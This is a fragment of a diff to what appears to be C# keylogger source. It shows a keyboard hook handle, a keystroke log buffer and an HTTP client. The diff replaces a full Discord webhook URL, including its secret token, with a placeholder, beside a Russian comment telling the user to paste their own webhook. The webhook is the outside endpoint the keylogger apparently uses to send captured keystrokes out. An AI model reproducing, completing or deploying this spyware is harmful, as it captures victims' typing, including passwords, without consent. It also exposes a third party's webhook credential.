@@ -20,7 +20,7 @@ namespace KeyLogger
         private static IntPtr _hookID = IntPtr.Zero;
 
         private static string discordWebhookUrl = // Сюда Вставляем Discord WebHook :)
-            "https://discord.com/api/webhooks/1454938521990074540/lhppLgUiEHYg7p-TTMAqhY2QMbW1mYZ0YWT2_nyXgsIREyTwk8i-8yzUCuL6Aj7r3QaI";
+            "-> Discord WebHook <- ";
 
         private static List<string> logBuffer = new List<string>();
         private static HttpClient httpClient = new HttpClient();
